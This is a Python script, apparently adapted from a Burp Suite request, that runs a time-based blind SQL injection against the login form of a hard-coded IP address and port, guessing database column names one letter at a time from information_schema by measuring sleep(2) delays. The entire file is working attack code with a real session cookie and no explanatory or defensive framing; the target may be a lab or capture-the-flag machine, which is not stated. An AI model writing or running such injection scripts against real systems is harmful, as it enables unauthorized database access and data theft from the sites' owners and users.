import requests
import time
#===================================================TEST get columns
word_text="abcdefghijklmnopqrstuvwxyz"
list_columns=""
chay = "chay"
name_columns=""

for ii in word_text:
    
    #print(i)
    print("TRY FIRST STRING columns ===> "+ii)
    inject = "1' and (select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '"+ii+"%' limit 0,1) like '%')-- -"

    burp0_url = "http://178.128.121.56:8001/index.php?page=login"
    burp0_cookies = {"PHPSESSID": "4477d705888855e2e3c96293f788e044"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://178.128.121.56:8001", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://178.128.121.56:8001/index.php?page=login/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_data = {"username": ""+inject+"", "password": "meo", "login": ''}
    a = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    #print(a.text[:100])
    #print(a.elapsed.total_seconds())
    if(a.elapsed.total_seconds() > 2 ):
        chay = "chay"
        name_columns=ii+"x"
        while(chay == "chay"):
            time.sleep(0.3)
            for i in word_text:
                #print(i)
                
                name_columns = name_columns[:-1] + i

                print("TRY TEXT ===> "+name_columns)
                inject = "1' and (select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '"+name_columns+"%' limit 0,1) like '%')-- -"

                burp0_url = "http://178.128.121.56:8001/index.php?page=login"
                burp0_cookies = {"PHPSESSID": "4477d705888855e2e3c96293f788e044"}
                burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://178.128.121.56:8001", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://178.128.121.56:8001/index.php?page=login/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
                burp0_data = {"username": ""+inject+"", "password": "meo", "login": ''}
                a = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
                #print(a.text[:100])
                #print(a.elapsed.total_seconds())
                if(a.elapsed.total_seconds() > 2 ):
                    
                    name_columns=name_columns+i
                    print("FOUND STRING columns BY VHAE :D ==>  "+name_columns[:-1])
                    break
                    
                
                elif(name_columns[-1:] == word_text[-1:]):
                    print("dung")
                    chay = "dung"

        print("\n")
        print("\n")
        print("===============   FINISH  ==============")
        print("\n")
        print("\n")
        print("NEW columns == "+name_columns[:-1])
        list_columns = list_columns+"\n"+name_columns[:-1]
        print("\n")
        print("\n")
        print("===============   FINISH  ==============")

print("\n")
print("\n")
print("===============   END LIST columns  ==============")
print(list_columns)